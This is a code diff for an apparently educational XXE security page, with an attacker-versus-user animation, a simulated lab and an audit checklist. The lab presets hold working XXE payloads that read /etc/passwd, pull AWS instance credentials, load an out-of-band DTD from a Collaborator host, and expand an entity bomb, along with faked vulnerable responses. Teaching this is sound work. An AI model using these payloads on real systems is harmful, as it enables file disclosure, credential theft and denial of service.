+      const verb = document.getElementById('xxeVerb');
+      const badgeFrom = document.getElementById('xxeBadgeFrom');
+      const badgeTo = document.getElementById('xxeBadgeTo');
+      const beam = document.getElementById('xxeBeamParticle');
+      const flowText = document.getElementById('xxeFlowStateText');
+      const targetCard = document.getElementById('xxeTargetCard');
+      const targetName = document.getElementById('xxeTargetName');
+      const targetStatus = document.getElementById('xxeTargetStatus');
+      const targetF1 = document.getElementById('xxeTargetField1');
+      const targetF2 = document.getElementById('xxeTargetField2');
+      const targetF3 = document.getElementById('xxeTargetField3');
+      const targetNote = document.getElementById('xxeTargetNote');
+
+      function setXxeState(isExploit) {
+        if (isExploit) {
+          btnExploit?.classList.add('active', 'exploit');
+          btnNormal?.classList.remove('active', 'safe');
+
+          if (avatar) {
+            avatar.textContent = '🥷';
+            avatar.style.borderColor = '#ef4444';
+            avatar.style.background = 'rgba(239, 68, 68, 0.15)';
+          }
+          if (label) { label.textContent = 'Rohan (Attacker)'; label.style.color = '#fca5a5'; }
+          if (sub) { sub.textContent = 'SYSTEM "/etc/passwd"'; }
+          if (verb) { verb.style.color = '#ef4444'; }
+          if (badgeFrom) { badgeFrom.textContent = '<name>Om</name>'; }
+          if (badgeTo) {
+            badgeTo.textContent = '&xxe;';
+            badgeTo.className = 'swap-id-badge to';
+          }
+          if (beam) { beam.classList.add('exploit'); }
+          if (flowText) { flowText.textContent = 'DTD External Entity Resolved'; flowText.style.color = '#f87171'; }
+
+          if (targetCard) {
+            targetCard.classList.remove('safe');
+            targetCard.classList.add('exploit');
+          }
+          if (targetName) targetName.textContent = 'XML Core Parser';
+          if (targetStatus) {
+            targetStatus.textContent = 'HTTP 200';
+            targetStatus.className = 'target-pill-status breach';
+          }
+          if (targetF1) targetF1.innerHTML = 'Entity: <code style="color:#f87171;">&amp;xxe;</code>';
+          if (targetF2) targetF2.innerHTML = 'Resolved: <code style="color:#ef4444;">/etc/passwd</code>';
+          if (targetF3) targetF3.innerHTML = 'Status: <code style="color:#ef4444;">root:x:0:0...</code>';
+          if (targetNote) targetNote.innerHTML = '🚨 Local File Disclosure';
+        } else {
+          btnNormal?.classList.add('active', 'safe');
+          btnExploit?.classList.remove('active', 'exploit');
+
+          if (avatar) {
+            avatar.textContent = '👤';
+            avatar.style.borderColor = '#10b981';
+            avatar.style.background = 'rgba(16, 185, 129, 0.15)';
+          }
+          if (label) { label.textContent = 'Vikram (User)'; label.style.color = '#34d399'; }
+          if (sub) { sub.textContent = 'Payload: <item>Laptop</item>'; }
+          if (verb) { verb.style.color = '#34d399'; }
+          if (badgeFrom) { badgeFrom.textContent = '<item>Laptop</item>'; }
+          if (badgeTo) {
+            badgeTo.textContent = '<item>Laptop</item>';
+            badgeTo.className = 'swap-id-badge from';
+          }
+          if (beam) { beam.classList.remove('exploit'); }
+          if (flowText) { flowText.textContent = 'Safe Entity Sanitization'; flowText.style.color = '#34d399'; }
+
+          if (targetCard) {
+            targetCard.classList.remove('exploit');
+            targetCard.classList.add('safe');
+          }
+          if (targetName) targetName.textContent = 'XML Core Parser';
+          if (targetStatus) {
+            targetStatus.textContent = 'HTTP 200';
+            targetStatus.className = 'target-pill-status safe';
+          }
+          if (targetF1) targetF1.innerHTML = 'Item: <code>Laptop</code>';
+          if (targetF2) targetF2.innerHTML = 'DTD: <code>Disabled</code>';
+          if (targetF3) targetF3.innerHTML = 'Status: <code style="color:#34d399;">Order Placed</code>';
+          if (targetNote) targetNote.innerHTML = '<span style="color:#34d399;">✓ Protected: defusedxml</span>';
+        }
+      }
+
+      btnNormal?.addEventListener('click', () => setXxeState(false));
+      btnExploit?.addEventListener('click', () => setXxeState(true));
+
+      // 4. Live Lab Preset Payloads & Simulator
+      const presets = {
+        safe: `<?xml version="1.0" encoding="UTF-8"?>
+<order>
+  <id>ORD-1002</id>
+  <item>MacBook Pro M3</item>
+  <quantity>1</quantity>
+</order>`,
+        passwd: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<order>
+  <id>ORD-1002</id>
+  <item>&xxe;</item>
+  <quantity>1</quantity>
+</order>`,
+        aws: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [
+  <!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role">
+]>
+<order>
+  <id>ORD-1002</id>
+  <item>&aws;</item>
+</order>`,
+        oob: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [
+  <!ENTITY % oob SYSTEM "http://collaborator.burp.internal/ping.dtd">
+  %oob;
+]>
+<order><id>ORD-1002</id></order>`,
+        bomb: `<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<order><item>&lol3;</item></order>`
+      };
+
+      const labInput = document.getElementById('labXmlInput');
+      if (labInput) labInput.value = presets.passwd;
+
+      window.loadLabPreset = function(type) {
+        if (labInput && presets[type]) {
+          labInput.value = presets[type];
+        }
+      };
+
+      window.runLabSimulation = function() {
+        const text = labInput?.value || '';
+        const isProtected = document.getElementById('labParserToggle')?.checked;
+        const out = document.getElementById('labOutputTerminal');
+        const badge = document.getElementById('labStatusBadge');
+
+        if (!out) return;
+
+        if (isProtected) {
+          if (text.includes('<!DOCTYPE') || text.includes('<!ENTITY')) {
+            badge.textContent = 'HTTP 400 Bad Request';
+            badge.style.color = '#ef4444';
+            out.textContent = `[SECURITY EXCEPTION] defusedxml.common.EntitiesForbidden:
+EntityRef or DTD declaration forbidden in incoming payload!
+Parser execution halted. Threat neutralized.
+
+HTTP/1.1 400 Bad Request
+Content-Type: application/json
+
+{"error": "Forbidden DTD Entity declaration in XML body"}`;
+          } else {
+            badge.textContent = 'HTTP 200 OK';
+            badge.style.color = '#10b981';
+            out.textContent = `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "success",
+  "message": "Order processed successfully",
+  "orderId": "ORD-1002",
+  "item": "MacBook Pro M3"
+}`;
+          }
+        } else {
+          if (text.includes('file:///etc/passwd')) {
+            badge.textContent = 'HTTP 200 OK (Vulnerable)';
+            badge.style.color = '#ef4444';
+            out.textContent = `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "success",
+  "orderId": "ORD-1002",
+  "item": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
+}`;
+          } else if (text.includes('169.254.169.254')) {
+            badge.textContent = 'HTTP 200 OK (Vulnerable)';
+            badge.style.color = '#ef4444';
+            out.textContent = `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "success",
+  "orderId": "ORD-1002",
+  "item": "{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"ASIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"AQoDYXdzEJr1...\",\n  \"Expiration\": \"2026-09-06T04:30:00Z\"\n}"
+}`;
+          } else if (text.includes('collaborator')) {
+            badge.textContent = 'HTTP 200 OK (OOB Triggered)';
+            badge.style.color = '#ef4444';
+            out.textContent = `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "success",
+  "orderId": "ORD-1002"
+}
+
+[Burp Collaborator Poller Activity Log]:
+>> Inbound DNS query resolved for collaborator.burp.internal from 54.210.12.98
+>> Inbound HTTP GET /ping.dtd received with User-Agent: Java/17.0.2 (libxml2 parser)`;
+          } else if (text.includes('&lol3;') || text.includes('&lol9;')) {
+            badge.textContent = 'HTTP 500 Server Error';
+            badge.style.color = '#f59e0b';
+            out.textContent = `[MEMORY EXHAUSTION WARNING]
+Fatal Error: Memory allocation of 3221225472 bytes exhausted (tried to allocate 1048576 bytes)
+Process killed: SIGKILL (OutOfMemory). Server instance restarted.`;
+          } else {
+            badge.textContent = 'HTTP 200 OK';
+            badge.style.color = '#10b981';
+            out.textContent = `HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "success",
+  "orderId": "ORD-1002",
+  "item": "MacBook Pro M3"
+}`;
+          }
+        }
+      };
+
+      runLabSimulation();
+
+      // 5. Checklist Interactive Logic
+      window.setChecklistStatus = function(event, btn, status) {
+        if (event) event.stopPropagation();
+        const item = btn.closest('.checklist-item');
+        if (!item) return;
+        const itemId = item.id;
+        const passBtn = item.querySelector('.pass-btn');
+        const failBtn = item.querySelector('.fail-btn');
+        const circleIcon = item.querySelector('.check-mark-icon');
+
+        const isCurrent = (status === 'pass' && item.classList.contains('item-passed')) ||
+                          (status === 'fail' && item.classList.contains('item-failed'));
+
+        if (isCurrent) {
+          item.classList.remove('item-passed', 'item-failed');
+          if (passBtn) passBtn.classList.remove('active');
+          if (failBtn) failBtn.classList.remove('active');
+          const itemNum = itemId.replace('check-item-', '');
+          if (circleIcon) circleIcon.innerText = itemNum;
+        } else {
+          if (status === 'pass') {
+            item.classList.add('item-passed');
+            item.classList.remove('item-failed');
+            if (passBtn) passBtn.classList.add('active');
+            if (failBtn) failBtn.classList.remove('active');
+            if (circleIcon) circleIcon.innerText = '✓';
+          } else {
+            item.classList.add('item-failed');
+            item.classList.remove('item-passed');
+            if (failBtn) failBtn.classList.add('active');
+            if (passBtn) passBtn.classList.remove('active');
+            if (circleIcon) circleIcon.innerText = '✕';
+          }
+        }
+
+        updateChecklistCounter();
+      };
+
+      window.toggleCheckCircle = function(event, el) {
+        if (event) event.stopPropagation();
+        const item = el.closest('.checklist-item');
+        if (!item) return;
+        if (item.classList.contains('item-passed')) {
+          setChecklistStatus(null, item.querySelector('.fail-btn'), 'fail');
+        } else if (item.classList.contains('item-failed')) {
+          setChecklistStatus(null, item.querySelector('.fail-btn'), 'fail');
+        } else {
+          setChecklistStatus(null, item.querySelector('.pass-btn'), 'pass');
+        }
+      };
+
+      window.handleCheckItemClick = function(event, item) {
+        if (event.target.closest('.check-actions-bar') || event.target.closest('code') || event.target.closest('.check-how-to-box') || event.target.closest('.check-burp-block')) {
+          return;
+        }
+        toggleCheckCircle(event, item);
+      };
+
+      function updateChecklistCounter() {
+        const items = document.querySelectorAll('.checklist-item');
+        const passed = document.querySelectorAll('.checklist-item.item-passed').length;
+        const failed = document.querySelectorAll('.checklist-item.item-failed').length;
+        const audited = passed + failed;
+        const total = items.length;
+
+        const counter = document.getElementById('checklist-progress-counter');
+        if (counter) {
+          counter.textContent = `${audited} of ${total} Checks Audited (${passed} Passed | ${failed} Vulnerable)`;
+        }
+      }
+
+      // 6. FAQ Accordion Handler
+      window.toggleFaq = function(el) {
+        const item = el.closest('.faq-item');
+        if (item) {
+          item.classList.toggle('active');
+        }
+      };
+    });
+  </script>
+</body>
+</html>
